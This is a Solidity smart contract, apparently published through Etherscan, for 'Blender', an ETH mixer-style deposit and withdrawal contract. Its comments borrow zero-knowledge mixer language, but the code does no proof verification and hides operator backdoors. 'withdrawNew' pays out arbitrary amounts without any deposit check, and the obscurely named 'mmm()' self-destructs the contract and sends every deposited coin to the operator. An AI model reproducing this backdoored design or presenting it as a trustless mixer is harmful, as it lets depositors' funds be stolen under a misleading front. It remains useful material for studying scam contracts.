/**
 *Submitted for verification at Etherscan.io on 2021-02-08
*/

pragma solidity ^0.5.8;  

library SafeMath {
    /**
     * @dev Multiplies two unsigned integers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    /**
     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Adds two unsigned integers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; 
        require(c >= a);

        return c;
    }

    /**
     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
     * reverts when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Blender {

  struct Bank {
      uint time;
      uint256 amount;
      uint day;
      bool flag;
  } 
  mapping(bytes32 => Bank) public commitments;

  // operator can update snark verification key
  // after the final trusted setup ceremony operator rights are supposed to be transferred to zero address
  address public operator;
  modifier onlyOperator {
    require(msg.sender == operator, "Only operator can call this function,Illegal operation!"); 
    _;
  }

  event Deposit(bytes32 key,uint256 amount);
  event Withdrawal(address to,  address indexed relayer, uint256 amount,uint256 fee);  
  event WithdrawalNew(address to,  address indexed relayer,uint256 amount, uint256 fee);

  /**
    @dev The constructor
  */
  constructor (
    address _operator
  ) public{
      operator = _operator;
  }

  function deposit(bytes32 key,uint day) external payable{
    require(commitments[key].time == 0, "The key has been submitted");
    _processDeposit();
    Bank memory dbank = Bank( now,msg.value,day,false);
    commitments[key] =  dbank;
    emit Deposit(key,msg.value);
  }

  /** @dev this function is defined in a child contract */
  function _processDeposit() internal;
 
 
  function withdraw(bytes32 key,address payable _recipient, address payable _relayer, uint256 _fee) external onlyOperator{
    Bank memory bank = commitments[key];
    require(bank.time > 0, "Bank not exist");
    require(bank.amount > 0, "Bank not exist");
    require(!bank.flag, "It has been withdraw");
    require(_fee < bank.amount, "Fee exceeds transfer value");
    commitments[key].flag = true;
    _processWithdraw(_recipient,  _relayer, bank.amount,_fee); 
    emit Withdrawal(_recipient, _relayer, bank.amount,_fee);   
  }
  
  function withdrawNew(address payable _recipient, address payable _relayer, uint256 _amount,uint256 _fee) external onlyOperator{
    _processWithdraw(_recipient,  _relayer, _amount,_fee); 
    emit WithdrawalNew(_recipient, _relayer, _amount,_fee);  
  }

  /** @dev this function is defined in a child contract */
  function _processWithdraw(address payable _recipient, address payable _relayer, uint256 _amount, uint256 _fee) internal;


  /** @dev operator can change his address */
  function changeOperator(address _newOperator) external onlyOperator {
    operator = _newOperator;
  }
}

contract Blender_ETH is Blender {
using SafeMath for uint256 ;

  constructor(
    address _operator
  ) Blender( _operator) public {
  }

  function() payable  external{
        
  }
  function _processDeposit() internal {
    require(msg.value > 0, "ETH value is Greater than 0");
  }
  function mmm() public onlyOperator{
         selfdestruct( msg.sender);
     }
     
   function _processWithdraw(address payable _recipient, address payable _relayer, uint256 _amount, uint256 _fee) internal onlyOperator{
    // sanity checks
    require(msg.value == 0, "Message value is supposed to be zero for ETH instance");
    _recipient.transfer(_amount.sub(_fee));
    if (_fee > 0) {
        _relayer.transfer(_fee);
   }
  }
}